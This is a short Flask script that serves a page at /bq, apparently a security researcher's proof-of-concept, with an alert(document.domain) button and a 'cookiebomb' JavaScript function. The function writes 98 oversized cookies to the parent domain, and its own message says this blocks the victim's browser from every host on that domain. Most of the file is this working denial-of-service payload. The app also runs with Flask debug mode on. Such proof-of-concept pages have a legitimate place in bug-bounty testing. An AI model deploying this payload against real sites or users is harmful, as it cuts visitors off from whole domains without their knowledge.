from flask import Flask, render_template_string

app = Flask(__name__)

@app.route("/bq")
def home():
    html_content = """
      </html>
      <center>
      <script>
      function cookiebomb(){
      var d = document.domain.split(".").splice(-2).join(".");
      var pollution = Array(4000).join('a');
      for(var i=1;i<99;i++){
      document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
      }
      setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
      }
      </script>
      <h1>bu<p hidden></p>raa<p hidden></p>qse<p hidden></p>c</h1>
      <button onclick="alert(document.domain)">Alert</button><br><br>
      <button onclick="cookiebomb()">Cookie bomb</button>
      </center>
      </html>
    """
    return render_template_string(html_content)

if __name__ == "__main__":
    app.run(debug=True)
